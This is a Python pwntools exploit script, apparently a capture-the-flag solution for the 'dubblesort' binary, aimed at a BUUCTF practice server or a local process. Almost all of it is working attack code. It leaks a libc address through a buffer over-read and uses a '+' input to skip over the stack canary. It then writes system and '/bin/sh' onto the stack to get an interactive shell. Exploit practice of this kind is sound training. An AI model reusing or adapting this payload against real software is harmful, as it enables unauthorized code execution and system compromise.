import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='dubblesort'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("../../i386libc/x86_libc.so.6")
pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',28618)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			# io=pdbg.run("local")
			io=process(['./dubblesort'],env={'LD_PRELOAD': '../../i386libc/x86_libc.so.6'})
			# libc=pdbg.libc
			libc=ELF('../../i386libc/x86_libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			# io=pdbg.run("remote")
			io=remote('node3.buuoj.cn',28618)
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			libc=ELF('../../i386libc/x86_libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def write_data(data):
			io.recvuntil('number : ')
			io.sendline(str(data))

		io.recv()
		io.send('a'*0x19)
		libc_base=u32(io.recvuntil('\xf7')[-4:])-0x1B0000-0x61
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		io.sendline('35')


		for i in range(24):
			write_data(0)

		write_data('+')
		for i in range(7):
			write_data(0xf7000000+i)

		write_data(system_addr)
		write_data(system_addr)
		write_data(bin_sh_addr)



		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue